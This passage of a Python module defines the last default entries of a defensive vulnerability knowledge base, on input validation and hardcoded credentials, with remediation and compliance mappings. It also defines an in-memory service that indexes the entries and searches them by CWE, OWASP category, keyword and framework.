            cwe_ids=["CWE-20", "CWE-22"],
            owasp_top10=["A03:2021-Injection"],
            nist_controls=["SI-10", "AC-6"],
            cis_benchmarks=["2.2.4"],
            remediation=[
                "Validate all input on the server side (never trust client validation alone)",
                "Use allow-list validation for expected formats, ranges, and types",
                "Implement parameterized queries for database operations",
                "Sanitize output based on the rendering context",
                "Use established validation libraries rather than custom regex",
            ],
            detection_methods=[
                "Fuzzing input fields with unexpected data types and values",
                "Static analysis for missing validation checks",
                "Review of API endpoint input handling",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/20.html",
                "https://owasp.org/Top10/A03_2021-Injection/",
            ],
            examples=[
                "Negative numbers accepted for quantity fields",
                "Extremely long strings causing buffer issues",
                "SQL metacharacters not stripped from search queries",
            ],
            impact="Injection attacks, data corruption, application crashes",
            effort="Low",
            tags=["input-validation", "sanitization", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-024",
            title="Hardcoded Credentials",
            description=(
                "Embedding usernames, passwords, API keys, or other credentials "
                "directly in source code, configuration files, or deployment "
                "scripts that can be extracted by attackers."
            ),
            category="Secrets Management",
            severity="critical",
            cwe_ids=["CWE-798", "CWE-259"],
            owasp_top10=["A07:2021-Identification and Authentication Failures"],
            nist_controls=["IA-5", "AC-3", "CM-6"],
            cis_benchmarks=["5.4.1"],
            remediation=[
                "Use environment variables or secret managers (Vault, AWS Secrets Manager)",
                "Rotate all credentials found in source code immediately",
                "Implement pre-commit hooks to detect secrets before they enter repositories",
                "Use short-lived credentials and automated rotation",
                "Audit code repositories for exposed secrets using tools like truffleHog",
            ],
            detection_methods=[
                "Secret scanning tools (truffleHog, GitLeaks, detect-secrets)",
                "Code review for credential patterns",
                "Repository history analysis for leaked secrets",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/798.html",
            ],
            examples=[
                'DATABASE_PASSWORD="supersecret123" in docker-compose.yml',
                "API_KEY = 'sk-1234567890abcdef' in source code",
                "Hardcoded AWS credentials in deployment script",
            ],
            impact="Unauthorized access, data breach, infrastructure compromise",
            effort="Low",
            tags=["secrets", "hardcoded", "credentials", "owasp"],
        ),
    ]
    return entries


# ── In-Memory Implementation ──────────────────────────────────────


class InMemoryVulnKnowledgeService(VulnKnowledgeService):
    """In-memory vulnerability knowledge service.

    Pre-populated with common vulnerability entries and their
    CWE mappings, remediation guidance, and compliance references.
    """

    def __init__(self, include_defaults: bool = True) -> None:
        """Initialize the knowledge service.

        Args:
            include_defaults: If True, populate with default entries.
        """
        self._entries: dict[str, VulnKnowledgeEntry] = {}
        self._category_index: dict[str, list[str]] = {}
        self._cwe_index: dict[str, list[str]] = {}
        self._owasp_index: dict[str, list[str]] = {}

        if include_defaults:
            for entry in _build_default_entries():
                self._add_to_indices(entry)
                self._entries[entry.id] = entry

    def _add_to_indices(self, entry: VulnKnowledgeEntry) -> None:
        """Add entry to all search indices."""
        self._category_index.setdefault(entry.category.lower(), []).append(entry.id)
        for cwe in entry.cwe_ids:
            self._cwe_index.setdefault(cwe.upper(), []).append(entry.id)
        for owasp in entry.owasp_top10:
            self._owasp_index.setdefault(owasp, []).append(entry.id)

    async def lookup_by_cwe(self, cwe_id: str) -> list[VulnKnowledgeEntry]:
        """Look up entries by CWE identifier.

        Args:
            cwe_id: CWE identifier (e.g., 'CWE-79' or '79').

        Returns:
            Matching knowledge entries.
        """
        normalized = cwe_id.upper()
        if not normalized.startswith("CWE-"):
            normalized = f"CWE-{normalized}"

        entry_ids = self._cwe_index.get(normalized, [])
        return [self._entries[eid] for eid in entry_ids if eid in self._entries]

    async def lookup_by_owasp(self, owasp_id: str) -> list[VulnKnowledgeEntry]:
        """Look up entries by OWASP Top 10 category.

        Args:
            owasp_id: OWASP category (e.g., 'A01:2021').

        Returns:
            Matching knowledge entries.
        """
        entry_ids = []
        for key, ids in self._owasp_index.items():
            if owasp_id in key:
                entry_ids.extend(ids)

        seen = set()
        results = []
        for eid in entry_ids:
            if eid not in seen and eid in self._entries:
                seen.add(eid)
                results.append(self._entries[eid])
        return results

    async def lookup_by_category(self, category: str) -> list[VulnKnowledgeEntry]:
        """Look up entries by vulnerability category.

        Args:
            category: Category name.

        Returns:
            Matching knowledge entries.
        """
        entry_ids = self._category_index.get(category.lower(), [])
        return [self._entries[eid] for eid in entry_ids if eid in self._entries]

    async def search(self, query: str, limit: int = 20) -> list[VulnKnowledgeEntry]:
        """Search knowledge entries by keyword.

        Args:
            query: Search query.
            limit: Maximum results.

        Returns:
            Matching entries.
        """
        query_lower = query.lower()
        results: list[VulnKnowledgeEntry] = []

        for entry in self._entries.values():
            if (
                query_lower in entry.title.lower()
                or query_lower in entry.description.lower()
                or query_lower in entry.category.lower()
                or any(query_lower in tag.lower() for tag in entry.tags)
                or any(query_lower in cwe.lower() for cwe in entry.cwe_ids)
            ):
                results.append(entry)
                if len(results) >= limit:
                    break

        return results

    async def get_all(self) -> list[VulnKnowledgeEntry]:
        """Get all knowledge entries.

        Returns:
            List of all entries.
        """
        return list(self._entries.values())

    async def get_entry(self, entry_id: str) -> VulnKnowledgeEntry | None:
        """Get a specific entry by ID.

        Args:
            entry_id: Entry identifier.

        Returns:
            Entry or None if not found.
        """
        return self._entries.get(entry_id)

    async def get_compliance_mappings(
        self, framework: str
    ) -> dict[str, list[str]]:
        """Get compliance framework mappings.

        Args:
            framework: Framework name ('owasp_top10', 'nist', 'cis').

        Returns:
            Mapping of control ID to list of entry IDs.
        """
        mappings: dict[str, list[str]] = {}

        for entry in self._entries.values():
            if framework == "owasp_top10":
                controls = entry.owasp_top10
            elif framework == "nist":
                controls = entry.nist_controls
            elif framework == "cis":
                controls = entry.cis_benchmarks
            else:
                continue

            for control in controls:
                mappings.setdefault(control, []).append(entry.id)

        return mappings

    async def add_entry(self, entry: VulnKnowledgeEntry) -> None:
        """Add a custom knowledge entry.

        Args:
            entry: Entry to add.
        """
        self._entries[entry.id] = entry
        self._add_to_indices(entry)
        logger.info("knowledge.entry_added", entry_id=entry.id, title=entry.title)
